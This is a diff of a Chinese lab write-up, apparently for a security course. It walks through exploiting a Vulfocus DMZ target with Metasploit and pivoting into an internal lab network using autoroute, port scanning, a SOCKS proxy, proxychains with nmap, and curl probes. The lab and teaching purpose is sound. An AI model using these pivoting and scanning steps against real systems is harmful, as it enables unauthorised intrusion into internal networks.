@@ -20,7 +20,7 @@ sudo tee /etc/apt/sources.list.d/docker.list
   sudo apt install -y docker-ce docker-ce-cli containerd.io
 ```
 
-成功安装后docker的版本信息应该如下所示(2025年3月)：
+成功安装后 docker 的版本信息应该如下所示(2025年3月)：
 
 ![](./img/docker版本信息.png)
 
@@ -32,7 +32,7 @@ sudo tee /etc/apt/sources.list.d/docker.list
 
 ![](./img/登录报错.png)
 
-呢么需要进入vulfocus的容器，执行下面的命令启动redis服务：
+呢么需要进入 vulfocus 的容器，执行下面的命令启动redis服务：
 
 ```bash
 redis-service
@@ -82,8 +82,8 @@ c4pr1c3/vulshare_nginx-php-flag
 
 这里有两种安装的方法：
 
-* 第一种是通过Vulfocus的GUI界面安装，它会直接调用 `docker pull`拉取镜像
-* 第二种事直接手动在命令行执行 `docker pull`拉取镜像，然后再通过Vulfocus的GUI界面将本地镜像添加进取
+* 第一种是通过 Vulfocus 的 GUI 界面安装，它会直接调用 `docker pull`拉取镜像
+* 第二种事直接手动在命令行执行 `docker pull`拉取镜像，然后再通过 Vulfocus 的 GUI 界面将本地镜像添加进取
 
 完成镜像拉取后，可以在下面的页面进行编排，详情如下：
 
@@ -106,7 +106,7 @@ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_
 
 ## DMZ 入口靶标
 
-入口靶标页面如下，记录目标ip和端口号
+入口靶标页面如下，记录目标 ip 和端口号
 
 ![](./img/入口靶标.png)
 
@@ -167,7 +167,7 @@ set LHOST  192.168.131.6   #攻击者主机IP
 
 ![](./img/检查参数设置.png)
 
-执行攻击，如果攻击成功，按照payload的内容可以获得靶机的shell:
+执行攻击，如果攻击成功，按照 payload 的内容可以获得靶机的 shell:
 
 ```bash
 run -j 
@@ -186,9 +186,9 @@ sessions -i 2
 
 得到flag
 
-## 内网第一层靶标
+## 建立立足点发现靶标2、3、4
 
-ctrl-z将session放入后台
+`ctrl-z`将 session 放入后台
 
 对要攻击的目标进行扫描：
 
@@ -198,7 +198,7 @@ db_nmap -p 60990,80,22 192.168.131.10 -A -T4 -n
 
 ![](./img/端口扫描.png)
 
-可以看出在扫描前 `hosts`的内容只有一个之前指定的ip地址，扫描的结果显示发现了22,80,60990均为开放端口
+可以看出在扫描前 `hosts`的内容只有一个之前指定的 ip 地址，扫描的结果显示发现了 22,80,60990 均为开放端口
 
 扫描过后再次查看 `hosts`和 `services`情况
 
@@ -208,11 +208,11 @@ db_nmap -p 60990,80,22 192.168.131.10 -A -T4 -n
 
 ![](./img/)
 
-升级shell为Meterpreter Shell
+升级 shell 为 Meterpreter Shell
 
 ![](./img/升级shell.png)
 
-进入升级后的shell并查看当前网络的情况：
+进入升级后的 shell 并查看当前网络的情况：
 
 ![](./img/查看网卡.png)
 
@@ -222,12 +222,100 @@ db_nmap -p 60990,80,22 192.168.131.10 -A -T4 -n
 
 接下来需要使用到**autoroute**
 
-> MSF的autoroute模块是MSF框架中自带的一个路由转发功能，实现过程是MSF框架在已经获取的Meterpreter Shell的基础上添加一条去往“内网”的路由，直接使用MSF去访问原本不能直接访问的内网资源.
+> MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是MSF框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用MSF去访问原本不能直接访问的内网资源.
 
-![](./img/)
+执行下面的命令建立新的路由并查看建立的结果：
 
-## 内网第二层靶标
+```bash
+run autoroute -s 192.170.84.0/24
+run autoroute -p
+```
+
+![](./img/autoroute.png)
+
+退出当前的 session 准备端口扫描：
+
+首先搜索需要的模块，然后选择需要使用的模块
+
+```bash
+search portscan
+use auxiliary/scanner/portscan/tcp
+```
+
+![](./img/内网端口扫描工具.png)
+
+和前面一样，查看需要的参数并进行配置：
+
+![](./img/内网端口扫描参数配置.png)
+
+```bash
+set RHOSTS 192.170.84.2-254 #根据之前的内网网关ip为192.170.84.1推断其他的ip一定是介于2到254
+set rport 7001 #为了加快扫描速度指定扫描端口为7001，这里也可以不指定，但会慢很多
+set threads 10 #多线程加快扫描速度
+```
+
+使用 `exploit`启动扫描:
+
+![](./img/内网扫描到新ip.png)
+
+新扫描到的 ip 被同步到了 `hosts`与 `services`表中：
+
+![](./img/内网新的ip已同步到hosts.png)
+
+然后搜索并使用另外一个 socks_proxy 模块,参数不用做修改
+
+![](./img/socks.png)
+
+直接启动:
+
+![](./img/启动socks_proxy.png)
+
+然后在攻击机中另开一个 shell:
+先检查下 1080 端口服务开放情况：
+
+```bash
+sudo lsof -i tcp:1080 -l -n -P
+```
+
+![](./img/检查1080.png)
+
+确定端口开放正常后，对下面的配置文件进行编辑，在其最后修改 socks 代理为 `socks5 127.0.0.1 1080 `
+
+```bash
+sudo vim /etc/proxychains4.conf
+```
+
+![](./img/修改socks5代理.png)
+
+然后执行下面的命令对内网进行扫描：
+
+```bash
+proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.170.84.2-5
+```
+
+![](./img/内网nmap7001扫描.png)
+
+可以看到扫描到的结果均为 filter (过滤)
+
+下面需要去验证这些断后是否针对能连通：
+进入入口机的 shell 当中，执行下面的 `curl`命令获取指定的内网网页内容：
+
+```bash
+curl http://192.170.84.2:7001 -vv
+curl http://192.170.84.4:7001 -vv
+curl http://192.170.84.5:7001 -vv
+```
+
+![](./img/curl指定内网网页1.png)
+
+返回的结果都为 404，说明网络层是连同的，只是该网页没有内容罢了
+
+## 攻击内网第一层靶标
+
+## 攻击内网第二层靶标
 
 参考资料：
+
+[网络安全(2023) 综合实验_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1p3411x7da/?vd_source=6c62cb1cac14ec9c6d9e57e7ba2e13c9)
 
 [利用msf自带的route模块穿透目标内网 - Guko&#39;s Blog](https://pingmaoer.github.io/2020/05/09/%E5%88%A9%E7%94%A8msf%E8%87%AA%E5%B8%A6%E7%9A%84route%E6%A8%A1%E5%9D%97%E7%A9%BF%E9%80%8F%E7%9B%AE%E6%A0%87%E5%86%85%E7%BD%91/)
